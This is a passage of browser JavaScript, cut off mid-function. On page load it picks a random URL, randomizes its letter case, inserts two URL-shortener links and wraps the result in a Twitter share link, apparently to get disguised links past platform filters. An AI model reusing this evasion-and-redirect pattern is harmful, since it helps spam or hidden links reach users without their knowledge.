        function randomizeCapitalization(input) {
          return input
            .split('')
            .map(char => {
              if (/[a-zA-Z]/.test(char)) { // Check if it's an alphabetic character
                return Math.random() < 0.5 ? char.toLowerCase() : char.toUpperCase();
              }
              return char; // Leave non-alphabetic characters unchanged
            })
            .join('');
        }
        
        // Redirect to a randomly chosen URL
        window.onload = () => {
            const randomIndex = Math.floor(Math.random() * urls.length);
            var chosen_url = urls[randomIndex];
            
            chosen_url = randomizeCapitalization(chosen_url);
            chosen_url = chosen_url.replace("111", "shorturl.at/F7MNq");
            chosen_url = chosen_url.replace("222", "shorturl.at/Cld73");
            chosen_url = "http://twitter.com/share?url=".concat(chosen_url);
